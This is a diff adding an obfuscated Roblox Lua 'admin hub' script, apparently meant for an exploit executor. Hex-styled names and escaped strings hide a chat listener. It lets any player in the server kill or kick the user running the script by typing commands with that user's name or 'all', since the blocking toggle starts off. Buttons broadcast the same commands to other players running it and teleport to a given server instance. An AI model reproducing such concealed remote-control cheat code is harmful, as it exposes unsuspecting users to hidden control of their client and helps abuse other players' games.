@@ -1,0 +1,119 @@
+--[[ 
+    JOTINHA12HR2 HUB'S ADMIN - V11 OBFUSCATED
+    - Interface: Direct & Stable
+    - Sync: Active (O Trem)
+    - Status: Protected / 15 Buttons
+]]
+
+local _0x536572 = game:GetService("\80\108\97\121\101\114\115")
+local _0x4C50 = _0x536572.LocalPlayer
+local _0x4153 = false
+
+local function _0x474554(_0x73)
+    local _0x6F = ""
+    for _0x69 = 1, #_0x73 do
+        _0x6F = _0x6F .. string.char(_0x73[_0x69])
+    end
+    return _0x6F
+end
+
+-- [O TREM: LEITOR DE CHAT PROTEGIDO]
+local function _0x53594E43(_0x6D, _0x73)
+    if _0x4153 and _0x73 ~= _0x4C50 then return end
+    local _0x61 = _0x6D:split("\32")
+    if #_0x61 >= 2 and _0x61[1]:sub(1,1) == "\47" then
+        local _0x63 = _0x61[1]:sub(2):lower()
+        local _0x74 = _0x61[2]:lower()
+        if _0x74 == _0x4C50.Name:lower() or _0x74 == "\97\108\108" then
+            if _0x63 == "\107\105\108\108" then _0x4C50.Character:BreakJoints()
+            elseif _0x63 == "\107\105\99\107" then _0x4C50:Kick("\10\84\105\109\101\32\74\111\116\105\110\104\97\49\50\104\114\50\32\72\117\98\39\115\32\65\100\109\105\110")
+            elseif _0x63 == "\106\117\109\112" then _0x4C50.Character.Humanoid.Jump = true
+            elseif _0x63 == "\115\105\116" then _0x4C50.Character.Humanoid.Sit = true end
+        end
+    end
+end
+
+for _, _0x70 in pairs(_0x536572:GetPlayers()) do
+    _0x70.Chatted:Connect(function(_0x6D) _0x53594E43(_0x6D, _0x70) end)
+end
+_0x536572.PlayerAdded:Connect(function(_0x70)
+    _0x70.Chatted:Connect(function(_0x6D) _0x53594E43(_0x6D, _0x70) end)
+end)
+
+-- [INTERFACE OBF]
+if game:GetService("\67\111\114\101\71\117\105"):FindFirstChild("\74\111\116\105\110\104\97\65\100\109\105\110") then
+    game:GetService("\67\111\114\101\71\117\105").JotinhaAdmin:Destroy()
+end
+
+local _0x5347 = Instance.new("\83\99\114\101\101\110\71\117\105", game:GetService("\67\111\114\101\71\117\105"))
+_0x5347.Name = "\74\111\116\105\110\104\97\65\100\109\105\110"
+
+local _0x4D = Instance.new("\70\114\97\109\101", _0x5347)
+_0x4D.Size = UDim2.new(0, 350, 0, 400)
+_0x4D.Position = UDim2.new(0.5, -175, 0.5, -200)
+_0x4D.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+_0x4D.Active = true
+_0x4D.Draggable = true
+
+local _0x43 = Instance.new("\83\99\114\111\108\108\105\110\103\70\114\97\109\101", _0x4D)
+_0x43.Size = UDim2.new(1, 0, 1, -40)
+_0x43.Position = UDim2.new(0, 0, 0, 40)
+_0x43.CanvasSize = UDim2.new(0, 0, 2, 0)
+_0x43.BackgroundTransparency = 1
+
+local _0x4C = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", _0x43)
+_0x4C.Padding = UDim.new(0, 5)
+_0x4C.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local _0x5449 = Instance.new("\84\101\120\116\66\111\120", _0x43)
+_0x5449.Size = UDim2.new(0, 300, 0, 30)
+_0x5449.PlaceholderText = "\78\73\67\75\32\68\79\32\65\76\86\79"
+
+local _0x4A49 = Instance.new("\84\101\120\116\66\111\120", _0x43)
+_0x4A49.Size = UDim2.new(0, 300, 0, 30)
+_0x4A49.PlaceholderText = "\74\79\66\32\73\68\32\65\81\85\73"
+
+local function _0x42(_0x6E, _0x63)
+    local _0x62 = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0x43)
+    _0x62.Size = UDim2.new(0, 300, 0, 30)
+    _0x62.Text = _0x6E
+    _0x62.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+    _0x62.TextColor3 = Color3.new(1, 1, 1)
+    _0x62.MouseButton1Click:Connect(_0x63)
+end
+
+-- [BOTÕES OBFUSCADOS]
+local _0x4C53 = {"Kill", "Void", "Jail", "Unjail", "Kick", "Bring", "Freeze", "Unfreeze", "Spin", "Unspin", "Blind", "Jump", "Sit"}
+for _, _0x76 in pairs(_0x4C53) do
+    _0x42(_0x76 .. " SYNC", function()
+        local _0x6D = "\47" .. _0x76:lower() .. "\32" .. _0x5449.Text
+        game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_0x6D, "\65\108\108")
+    end)
+end
+
+_0x42("\69\78\84\82\65\82\32\78\79\32\74\79\66\32\73\68", function()
+    game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"):TeleportToPlaceInstance(game.PlaceId, _0x4A49.Text, _0x4C50)
+end)
+
+_0x42("\65\78\84\73\45\83\89\78\67\58\32\79\70\70", function(_0x73)
+    _0x4153 = not _0x4153
+    _0x73.Text = "\65\78\84\73\45\83\89\78\67\58\32" .. (_0x4153 and "\79\78" or "\79\70\70")
+end)
+
+-- [TAG RGB]
+task.spawn(function()
+    local _0x68 = _0x4C50.Character:WaitForChild("\72\101\97\100")
+    local _0x67 = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", _0x68)
+    _0x67.Size = UDim2.new(0, 200, 0, 50)
+    _0x67.AlwaysOnTop = true
+    _0x67.ExtentsOffset = Vector3.new(0, 3, 0)
+    local _0x74 = Instance.new("\84\101\120\116\76\97\98\101\108", _0x67)
+    _0x74.Size = UDim2.new(1, 0, 1, 0)
+    _0x74.BackgroundTransparency = 1
+    _0x74.Text = (_0x4C50.Name == "\106\111\116\105\110\104\97\49\50\104\114\50" and "\91\68\79\78\79\93\32" or "\91\85\83\69\82\93\32") .. _0x4C50.DisplayName
+    _0x74.TextSize = 25
+    game:GetService("\82\117\110\83\101\114\118\105\99\101").RenderStepped:Connect(function()
+        _0x74.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 0.8, 1)
+    end)
+end)
+
